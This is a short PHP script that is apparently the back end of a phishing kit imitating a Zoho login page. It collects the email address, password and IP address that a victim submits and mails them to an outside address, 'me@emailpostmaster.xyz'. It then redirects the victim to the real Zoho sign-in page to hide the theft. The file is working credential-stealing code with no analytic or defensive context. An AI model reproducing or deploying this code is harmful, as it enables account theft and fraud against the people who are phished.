<?php
$email = $_POST['email'];
$password = $_POST['password'];
@$next = $_POST['next'];
$ip = $_SERVER['REMOTE_ADDR'];
$main="https://accounts.zoho.eu/signin?servicename=ZohoHome&signupurl=https://www.zoho.eu/signup.html";
$message .= "--------------zoho Info-----------------------\n";
$message .= "E : ".$email."\n";
$message .= "P : ".$password."\n";
$message .= "-------------Zoho Info-----------------------\n";
$message .= "|IP: ".$ip."\n";

$send = "me@emailpostmaster.xyz";
$subject = "$ip Zoho ";


mail($send,$subject,$message);



if (isset($next))
{
    if (isset($_SERVER["HTTP_REFERER"])) {
        header("Location: " . $main);
    }

}

else {
    header( "Location: index2.php?uploaded=".$email );
}
